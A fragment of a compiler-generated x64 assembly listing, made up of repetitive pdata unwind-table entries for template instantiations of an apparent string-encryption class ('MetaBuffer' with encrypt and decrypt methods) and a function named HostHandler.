	DD	imagerel $unwind$??0?$MetaBuffer@$0GH@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@QEAA@PEBE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?isDecrypted@?$MetaBuffer@$0GH@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@QEBA_NXZ DD imagerel $LN3
	DD	imagerel $LN3+51
	DD	imagerel $unwind$?isDecrypted@?$MetaBuffer@$0GH@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@QEBA_NXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$0GH@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@QEAAPEBDXZ DD imagerel $LN7
	DD	imagerel $LN7+153
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$0GH@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@QEAAPEBDXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?encrypt@?$MetaBuffer@$0GH@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+68
	DD	imagerel $unwind$?encrypt@?$MetaBuffer@$0GH@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$0GH@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+70
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$0GH@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0?$MetaBuffer@$0BN@$0EE@U?$integer_sequence@_K$0A@$00$01$02$03@std@@@@QEAA@PEBE@Z DD imagerel $LN3
	DD	imagerel $LN3+290
	DD	imagerel $unwind$??0?$MetaBuffer@$0BN@$0EE@U?$integer_sequence@_K$0A@$00$01$02$03@std@@@@QEAA@PEBE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?isDecrypted@?$MetaBuffer@$0BN@$0EE@U?$integer_sequence@_K$0A@$00$01$02$03@std@@@@QEBA_NXZ DD imagerel $LN3
	DD	imagerel $LN3+51
	DD	imagerel $unwind$?isDecrypted@?$MetaBuffer@$0BN@$0EE@U?$integer_sequence@_K$0A@$00$01$02$03@std@@@@QEBA_NXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$0BN@$0EE@U?$integer_sequence@_K$0A@$00$01$02$03@std@@@@QEAAPEBDXZ DD imagerel $LN7
	DD	imagerel $LN7+153
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$0BN@$0EE@U?$integer_sequence@_K$0A@$00$01$02$03@std@@@@QEAAPEBDXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?encrypt@?$MetaBuffer@$0BN@$0EE@U?$integer_sequence@_K$0A@$00$01$02$03@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+68
	DD	imagerel $unwind$?encrypt@?$MetaBuffer@$0BN@$0EE@U?$integer_sequence@_K$0A@$00$01$02$03@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$0BN@$0EE@U?$integer_sequence@_K$0A@$00$01$02$03@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+70
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$0BN@$0EE@U?$integer_sequence@_K$0A@$00$01$02$03@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0?$MetaBuffer@$04$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07@std@@@@QEAA@PEBE@Z DD imagerel $LN3
	DD	imagerel $LN3+458
	DD	imagerel $unwind$??0?$MetaBuffer@$04$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07@std@@@@QEAA@PEBE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?isDecrypted@?$MetaBuffer@$04$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07@std@@@@QEBA_NXZ DD imagerel $LN3
	DD	imagerel $LN3+51
	DD	imagerel $unwind$?isDecrypted@?$MetaBuffer@$04$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07@std@@@@QEBA_NXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$04$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07@std@@@@QEAAPEBDXZ DD imagerel $LN7
	DD	imagerel $LN7+153
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$04$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07@std@@@@QEAAPEBDXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?encrypt@?$MetaBuffer@$04$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+68
	DD	imagerel $unwind$?encrypt@?$MetaBuffer@$04$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$04$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+70
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$04$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0?$MetaBuffer@$0N@$0CM@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEAA@PEBE@Z DD imagerel $LN3
	DD	imagerel $LN3+248
	DD	imagerel $unwind$??0?$MetaBuffer@$0N@$0CM@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEAA@PEBE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?isDecrypted@?$MetaBuffer@$0N@$0CM@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEBA_NXZ DD imagerel $LN3
	DD	imagerel $LN3+51
	DD	imagerel $unwind$?isDecrypted@?$MetaBuffer@$0N@$0CM@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEBA_NXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$0N@$0CM@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEAAPEBDXZ DD imagerel $LN7
	DD	imagerel $LN7+153
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$0N@$0CM@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEAAPEBDXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?encrypt@?$MetaBuffer@$0N@$0CM@U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+68
	DD	imagerel $unwind$?encrypt@?$MetaBuffer@$0N@$0CM@U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$0N@$0CM@U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+70
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$0N@$0CM@U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0?$MetaBuffer@$0ED@$0DF@U?$integer_sequence@_K$0A@$00$01$02$03@std@@@@QEAA@PEBE@Z DD imagerel $LN3
	DD	imagerel $LN3+290
	DD	imagerel $unwind$??0?$MetaBuffer@$0ED@$0DF@U?$integer_sequence@_K$0A@$00$01$02$03@std@@@@QEAA@PEBE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?isDecrypted@?$MetaBuffer@$0ED@$0DF@U?$integer_sequence@_K$0A@$00$01$02$03@std@@@@QEBA_NXZ DD imagerel $LN3
	DD	imagerel $LN3+51
	DD	imagerel $unwind$?isDecrypted@?$MetaBuffer@$0ED@$0DF@U?$integer_sequence@_K$0A@$00$01$02$03@std@@@@QEBA_NXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$0ED@$0DF@U?$integer_sequence@_K$0A@$00$01$02$03@std@@@@QEAAPEBDXZ DD imagerel $LN7
	DD	imagerel $LN7+153
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$0ED@$0DF@U?$integer_sequence@_K$0A@$00$01$02$03@std@@@@QEAAPEBDXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?encrypt@?$MetaBuffer@$0ED@$0DF@U?$integer_sequence@_K$0A@$00$01$02$03@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+68
	DD	imagerel $unwind$?encrypt@?$MetaBuffer@$0ED@$0DF@U?$integer_sequence@_K$0A@$00$01$02$03@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$0ED@$0DF@U?$integer_sequence@_K$0A@$00$01$02$03@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+70
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$0ED@$0DF@U?$integer_sequence@_K$0A@$00$01$02$03@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0?$MetaBuffer@$0CF@$0FK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEAA@PEBE@Z DD imagerel $LN3
	DD	imagerel $LN3+668
	DD	imagerel $unwind$??0?$MetaBuffer@$0CF@$0FK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEAA@PEBE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?isDecrypted@?$MetaBuffer@$0CF@$0FK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEBA_NXZ DD imagerel $LN3
	DD	imagerel $LN3+51
	DD	imagerel $unwind$?isDecrypted@?$MetaBuffer@$0CF@$0FK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEBA_NXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$0CF@$0FK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEAAPEBDXZ DD imagerel $LN7
	DD	imagerel $LN7+153
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$0CF@$0FK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEAAPEBDXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?encrypt@?$MetaBuffer@$0CF@$0FK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+68
	DD	imagerel $unwind$?encrypt@?$MetaBuffer@$0CF@$0FK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$0CF@$0FK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+70
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$0CF@$0FK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0?$MetaBuffer@$0CP@$0EH@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAA@PEBE@Z DD imagerel $LN3
	DD	imagerel $LN3+332
	DD	imagerel $unwind$??0?$MetaBuffer@$0CP@$0EH@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAA@PEBE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?isDecrypted@?$MetaBuffer@$0CP@$0EH@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEBA_NXZ DD imagerel $LN3
	DD	imagerel $LN3+51
	DD	imagerel $unwind$?isDecrypted@?$MetaBuffer@$0CP@$0EH@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEBA_NXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$0CP@$0EH@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAAPEBDXZ DD imagerel $LN7
	DD	imagerel $LN7+153
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$0CP@$0EH@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAAPEBDXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?encrypt@?$MetaBuffer@$0CP@$0EH@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+68
	DD	imagerel $unwind$?encrypt@?$MetaBuffer@$0CP@$0EH@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$0CP@$0EH@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+70
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$0CP@$0EH@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0?$MetaBuffer@$0GL@$0CG@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEAA@PEBE@Z DD imagerel $LN3
	DD	imagerel $LN3+248
	DD	imagerel $unwind$??0?$MetaBuffer@$0GL@$0CG@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEAA@PEBE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?isDecrypted@?$MetaBuffer@$0GL@$0CG@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEBA_NXZ DD imagerel $LN3
	DD	imagerel $LN3+51
	DD	imagerel $unwind$?isDecrypted@?$MetaBuffer@$0GL@$0CG@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEBA_NXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$0GL@$0CG@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEAAPEBDXZ DD imagerel $LN7
	DD	imagerel $LN7+153
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$0GL@$0CG@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEAAPEBDXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?encrypt@?$MetaBuffer@$0GL@$0CG@U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+68
	DD	imagerel $unwind$?encrypt@?$MetaBuffer@$0GL@$0CG@U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$0GL@$0CG@U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+70
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$0GL@$0CG@U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0?$MetaBuffer@$0EJ@$0CB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@@std@@@@QEAA@PEBE@Z DD imagerel $LN3
	DD	imagerel $LN3+1424
	DD	imagerel $unwind$??0?$MetaBuffer@$0EJ@$0CB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@@std@@@@QEAA@PEBE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?isDecrypted@?$MetaBuffer@$0EJ@$0CB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@@std@@@@QEBA_NXZ DD imagerel $LN3
	DD	imagerel $LN3+51
	DD	imagerel $unwind$?isDecrypted@?$MetaBuffer@$0EJ@$0CB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@@std@@@@QEBA_NXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$0EJ@$0CB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@@std@@@@QEAAPEBDXZ DD imagerel $LN7
	DD	imagerel $LN7+153
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$0EJ@$0CB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@@std@@@@QEAAPEBDXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?encrypt@?$MetaBuffer@$0EJ@$0CB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+68
	DD	imagerel $unwind$?encrypt@?$MetaBuffer@$0EJ@$0CB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$0EJ@$0CB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+70
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$0EJ@$0CB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?HostHandler@@YAKPEAX@Z DD imagerel $LN23
	DD	imagerel $LN23+584
	DD	imagerel $unwind$?HostHandler@@YAKPEAX@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0?$MetaBuffer@$0FJ@$0GC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@@std@@@@QEAA@PEBE@Z DD imagerel $LN3
	DD	imagerel $LN3+2516
	DD	imagerel $unwind$??0?$MetaBuffer@$0FJ@$0GC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@@std@@@@QEAA@PEBE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?isDecrypted@?$MetaBuffer@$0FJ@$0GC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@@std@@@@QEBA_NXZ DD imagerel $LN3
	DD	imagerel $LN3+51
